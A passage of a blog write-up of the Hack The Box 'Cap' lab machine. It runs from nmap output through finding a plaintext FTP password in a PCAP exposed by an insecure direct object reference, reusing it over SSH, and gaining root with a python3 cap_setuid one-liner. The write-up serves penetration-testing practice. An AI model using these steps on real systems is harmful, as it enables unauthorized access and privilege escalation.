+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:n</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;h1&gt;&lt;p&gt;Bad</span>\x<span style="color:#8b949e;font-style:italic">20Request&lt;/p&gt;&lt;/h1&gt;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20Invali
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:d</span>\x<span style="color:#8b949e;font-style:italic">20HTTP</span>\x<span style="color:#8b949e;font-style:italic">20Version</span>\x<span style="color:#8b949e;font-style:italic">20&#39;Invalid</span>\x<span style="color:#8b949e;font-style:italic">20HTTP</span>\x<span style="color:#8b949e;font-style:italic">20Version:</span>\x<span style="color:#8b949e;font-style:italic">20&#39;RTSP
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:/1</span>\.<span style="color:#8b949e;font-style:italic">0&#39;&#39;</span>\n\x<span style="color:#8b949e;font-style:italic">20</span>\x<span style="color:#8b949e;font-style:italic">20&lt;/body&gt;</span>\n<span style="color:#8b949e;font-style:italic">&lt;/html&gt;</span>\n<span style="color:#8b949e;font-style:italic">&#34;)%r(FourOhFourRequest,189
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:,&#34;HTTP/1</span>\.<span style="color:#8b949e;font-style:italic">0</span>\x<span style="color:#8b949e;font-style:italic">20404</span>\x<span style="color:#8b949e;font-style:italic">20NOT</span>\x<span style="color:#8b949e;font-style:italic">20FOUND</span>\r\n<span style="color:#8b949e;font-style:italic">Server:</span>\x<span style="color:#8b949e;font-style:italic">20gunicorn</span>\r\n<span style="color:#8b949e;font-style:italic">Date:</span>\x<span style="color:#8b949e;font-style:italic">20T
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:ue,</span>\x<span style="color:#8b949e;font-style:italic">2020</span>\x<span style="color:#8b949e;font-style:italic">20Jul</span>\x<span style="color:#8b949e;font-style:italic">202021</span>\x<span style="color:#8b949e;font-style:italic">2013:13:50</span>\x<span style="color:#8b949e;font-style:italic">20GMT</span>\r\n<span style="color:#8b949e;font-style:italic">Connection:</span>\x<span style="color:#8b949e;font-style:italic">20close</span>\r\n<span style="color:#8b949e;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:Content-Type:</span>\x<span style="color:#8b949e;font-style:italic">20text/html;</span>\x<span style="color:#8b949e;font-style:italic">20charset=utf-8</span>\r\n<span style="color:#8b949e;font-style:italic">Content-Length:</span>\x<span style="color:#8b949e;font-style:italic">20232\
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:r</span>\n\r\n<span style="color:#8b949e;font-style:italic">&lt;!DOCTYPE</span>\x<span style="color:#8b949e;font-style:italic">20HTML</span>\x<span style="color:#8b949e;font-style:italic">20PUBLIC</span>\x<span style="color:#8b949e;font-style:italic">20</span>\&#34;<span style="color:#8b949e;font-style:italic">-//W3C//DTD</span>\x<span style="color:#8b949e;font-style:italic">20HTML</span>\x<span style="color:#8b949e;font-style:italic">203</span>\.<span style="color:#8b949e;font-style:italic">2</span>\x<span style="color:#8b949e;font-style:italic">20
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:Final//EN</span>\&#34;<span style="color:#8b949e;font-style:italic">&gt;</span>\n<span style="color:#8b949e;font-style:italic">&lt;title&gt;404</span>\x<span style="color:#8b949e;font-style:italic">20Not</span>\x<span style="color:#8b949e;font-style:italic">20Found&lt;/title&gt;</span>\n<span style="color:#8b949e;font-style:italic">&lt;h1&gt;Not</span>\x<span style="color:#8b949e;font-style:italic">20Found&lt;/h1&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:</span>\n<span style="color:#8b949e;font-style:italic">&lt;p&gt;The</span>\x<span style="color:#8b949e;font-style:italic">20requested</span>\x<span style="color:#8b949e;font-style:italic">20URL</span>\x<span style="color:#8b949e;font-style:italic">20was</span>\x<span style="color:#8b949e;font-style:italic">20not</span>\x<span style="color:#8b949e;font-style:italic">20found</span>\x<span style="color:#8b949e;font-style:italic">20on</span>\x<span style="color:#8b949e;font-style:italic">20the</span>\x<span style="color:#8b949e;font-style:italic">20ser
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:ver</span>\.\x<span style="color:#8b949e;font-style:italic">20If</span>\x<span style="color:#8b949e;font-style:italic">20you</span>\x<span style="color:#8b949e;font-style:italic">20entered</span>\x<span style="color:#8b949e;font-style:italic">20the</span>\x<span style="color:#8b949e;font-style:italic">20URL</span>\x<span style="color:#8b949e;font-style:italic">20manually</span>\x<span style="color:#8b949e;font-style:italic">20please</span>\x<span style="color:#8b949e;font-style:italic">20ch
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">SF:eck</span>\x<span style="color:#8b949e;font-style:italic">20your</span>\x<span style="color:#8b949e;font-style:italic">20spelling</span>\x<span style="color:#8b949e;font-style:italic">20and</span>\x<span style="color:#8b949e;font-style:italic">20try</span>\x<span style="color:#8b949e;font-style:italic">20again</span>\.<span style="color:#8b949e;font-style:italic">&lt;/p&gt;</span>\n<span style="color:#8b949e;font-style:italic">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-style:italic"></span><span style="color:#79c0ff;font-weight:bold"># Nmap done at Tue Jul 20 09:11:21 2021 -- 1 IP address (1 host up) scanned in 160.86 seconds
+</span></span></span></code></pre></div><p>Initial enumeration of the FTP service led to no interesting results, leaving me with only the web application to enumerate. I began by manually exploring the site:</p>
+<p><img src="web0.png" alt=""> <img src="web1.png" alt=""> <img src="web2.png" alt=""> <img src="web3.png" alt=""></p>
+<p>One thing that stood out to me was that the <code>/data/</code> directory containing PCAP files seems to use an incremental numerical ID for each successive file. One can verify this by manually modifying the search to <code>/data/?</code> with <code>?</code> being whatever ID the user wishes to view. Incrementing the ID from one doesn&rsquo;t seem to provide anything useful, but decrementing the value leads the user to discover something highly interesting at <code>/data/0</code>:</p>
+<p><img src="web4.png" alt=""></p>
+<p>Downloading and subsequently running the <code>strings</code> command leads to the discovery of a potential password:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/cap<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ strings 0.pcap
+</span></span><span style="display:flex;"><span>EErP
+</span></span><span style="display:flex;"><span>EErP
+</span></span><span style="display:flex;"><span>GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 192.168.196.16
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">220</span> <span style="color:#ff7b72;font-weight:bold">(</span>vsFTPd 3.0.3<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>USER nathan
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>su@
+</span></span><span style="display:flex;"><span>Jsv@
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">331</span> Please specify the password.
+</span></span><span style="display:flex;"><span>PASS Buck3tH4TF0RM3!
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">(</span>sw@
+</span></span><span style="display:flex;"><span>?sx@
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">230</span> Login successful.
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#34;]#P
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">SYST
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">...
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">┌──(kali@kali)-[~/htb/cap]
+</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">└─</span>$<span style="color:#a5d6ff">
+</span></span></span></code></pre></div><p>Utilizing the username <code>nathan</code>, which was identified on the security dashboard web application, I was able to log in to SSH:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali@kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~/htb/cap<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span>└─$ ssh nathan@10.10.10.245
+</span></span><span style="display:flex;"><span>nathan@10.10.10.245<span style="color:#f85149">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.2 LTS <span style="color:#ff7b72;font-weight:bold">(</span>GNU/Linux 5.4.0-80-generic x86_64<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span>    * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span>    * Support:        https://ubuntu.com/advantage
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    System information as of Wed Sep <span style="color:#a5d6ff">15</span> 19:34:44 UTC <span style="color:#a5d6ff">2021</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    System load:           0.0
+</span></span><span style="display:flex;"><span>    Usage of /:            36.6% of 8.73GB
+</span></span><span style="display:flex;"><span>    Memory usage:          20%
+</span></span><span style="display:flex;"><span>    Swap usage:            0%
+</span></span><span style="display:flex;"><span>    Processes:             <span style="color:#a5d6ff">221</span>
+</span></span><span style="display:flex;"><span>    Users logged in:       <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>    IPv4 address <span style="color:#ff7b72">for</span> eth0: 10.10.10.245
+</span></span><span style="display:flex;"><span>    IPv6 address <span style="color:#ff7b72">for</span> eth0: dead:beef::250:56ff:feb9:102a
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72;font-weight:bold">=</span>&gt; There is <span style="color:#a5d6ff">1</span> zombie process.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    * Super-optimized <span style="color:#ff7b72">for</span> small spaces - read how we shrank the memory
+</span></span><span style="display:flex;"><span>    footprint of MicroK8s to make it the smallest full K8s around.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    https://ubuntu.com/blog/microk8s-memory-optimisation
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">63</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">42</span> of these updates are standard security updates.
+</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#ff7b72">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Last login: Thu May <span style="color:#a5d6ff">27</span> 11:21:27 <span style="color:#a5d6ff">2021</span> from 10.10.14.7
+</span></span><span style="display:flex;"><span>nathan@cap:~$
+</span></span></code></pre></div><h1 id="privilege-escalation">
+  Privilege Escalation
+  <a class="heading-link" href="#privilege-escalation">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Once on the box, the first step I generally take is to run an automated enumeration script such as <code>linpeas.sh</code>. Having already obtained valid credentials, transferring the script is trivial utilizing <code>scp</code>. Once on the box and running, I was able to identify a particular portion of the output that points to an easy privilege escalation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Files with capabilities <span style="color:#ff7b72;font-weight:bold">(</span>limited to 50<span style="color:#ff7b72;font-weight:bold">)</span>:
+</span></span><span style="display:flex;"><span>/usr/bin/python3.8 <span style="color:#ff7b72;font-weight:bold">=</span> cap_setuid,cap_net_bind_service+eip 
+</span></span><span style="display:flex;"><span>/usr/bin/ping <span style="color:#ff7b72;font-weight:bold">=</span> cap_net_raw+ep 
+</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils <span style="color:#ff7b72;font-weight:bold">=</span> cap_net_raw+ep 
+</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet <span style="color:#ff7b72;font-weight:bold">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style="color:#ff7b72;font-weight:bold">=</span> cap_net_bind_service,cap_net_admin+ep 
+</span></span></code></pre></div><p>The <code>cap_setuid</code> <a href="https://manpages.debian.org/testing/libcap-dev/cap_setuid.3.en.html"  class="external-link" target="_blank" rel="noopener">capability</a> being assigned to python is an obvious target for exploitation. Essentially, that capability allows any running python process to arbitrarily manipulate Linux <code>uid</code> values while performing system calls. This means that a python script could simply state that it needs to run a given system call as <code>root</code> and make it so for that particular command only. From an attacker&rsquo;s perspective, it doesn&rsquo;t really matter whether that capability is ephemeral as the user can simply utilize it to create a new shell session as <code>root</code>.</p>
+<p><a href="https://gtfobins.github.io/gtfobins/python/"  class="external-link" target="_blank" rel="noopener">GTFObins</a> provides attackers with a simple command to run to exploit the capability:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nathan@cap:~$ which python
+</span></span><span style="display:flex;"><span>nathan@cap:~$ which python3
+</span></span><span style="display:flex;"><span>/usr/bin/python3
+</span></span><span style="display:flex;"><span>nathan@cap:~$ python3 -c <span style="color:#a5d6ff">&#39;import os; os.setuid(0); os.system(&#34;/usr/bin/bash&#34;)&#39;</span>
+</span></span><span style="display:flex;"><span>root@cap:~# id
+</span></span><span style="display:flex;"><span><span style="color:#79c0ff">uid</span><span style="color:#ff7b72;font-weight:bold">=</span>0<span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">gid</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>nathan<span style="color:#ff7b72;font-weight:bold">)</span> <span style="color:#79c0ff">groups</span><span style="color:#ff7b72;font-weight:bold">=</span>1001<span style="color:#ff7b72;font-weight:bold">(</span>nathan<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>root@cap:~# 
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
